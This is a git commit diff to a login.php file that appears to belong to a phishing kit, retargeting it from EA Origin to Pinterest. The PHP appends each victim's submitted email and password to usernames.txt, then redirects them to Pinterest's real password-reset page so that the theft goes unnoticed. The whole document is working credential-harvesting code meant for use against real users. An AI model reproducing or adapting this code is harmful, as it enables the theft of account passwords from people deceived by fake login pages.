91dd708d75101b03deda15b58de55a17454ce1d6
yash <yashvyavahare02@gmail.com>
2023-06-11 23:45:21 +0530

    Updated Pinterest page

--- .server/www/login.php
+++ .server/www/login.php
@@ -1,6 +1,5 @@
 <?php
-
-file_put_contents("usernames.txt", "Origin Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://signin.ea.com/p/originX/resetPassword?execution=e1430406479s1');
+file_put_contents("usernames.txt", "Pinterest Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+header('Location: https://www.pinterest.com/password/reset/');
 exit();
 ?>
